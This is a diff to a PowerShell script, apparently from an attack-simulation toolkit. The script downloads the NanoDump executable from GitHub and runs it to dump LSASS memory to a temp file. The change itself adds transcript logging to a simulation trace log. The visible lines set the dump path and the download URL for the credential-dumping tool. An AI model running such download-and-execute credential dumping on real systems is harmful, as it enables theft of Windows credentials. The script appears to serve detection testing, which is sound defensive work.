@@ -6,6 +6,8 @@
     Download NanoDump from project https://github.com/helpsystems/nanodump/tree/main/dist and execute it with differents techniques
 #>
 
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
+
 $dumpfile = "$env:tmp\nano_lsassdump.dmp"
 $outfile = "$env:tmp\nanodmp.exe"
 $x32 = "https://raw.githubusercontent.com/helpsystems/nanodump/main/dist/nanodump.x86.exe"
@@ -49,3 +51,4 @@ catch{
     Write-Error $_
 }
 
+Stop-Transcript
